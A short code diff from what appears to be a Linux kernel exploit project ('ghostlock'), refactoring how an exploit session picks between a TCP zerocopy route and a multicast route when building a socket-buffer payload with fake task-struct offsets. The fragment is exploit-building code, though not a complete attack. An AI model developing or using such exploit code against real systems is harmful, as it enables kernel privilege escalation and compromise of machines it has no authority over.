@@ -33,14 +33,6 @@ namespace ghostlock::support {
         (void) fsync(STDOUT_FILENO);
     }
 
-    int tcp_route_selected(void) {
-        return target_profile_route(&g_exploit_session.profile) == kRouteTcpZerocopy;
-    }
-
-    int kernel5_route_selected(void) {
-        return target_profile_route(&g_exploit_session.profile) == kRouteMulticastWaiter;
-    }
-
     void read_first_line(const char *path, char *buf, size_t len) {
         if (!len) {
             return;
@@ -319,7 +311,7 @@ namespace ghostlock::support {
     int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
         memset(skb_buf, 0, SKB_SEND_SIZE);
 
-        int tcp = tcp_route_selected();
+        int tcp = target_profile_supports_tcp_zerocopy(&g_exploit_session.profile);
         long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
         size_t chunk_bias = tcp ? 0xe80 : (size_t) SKB_FRAG_BIAS;
         size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t) FAKE_TASK_OFF;
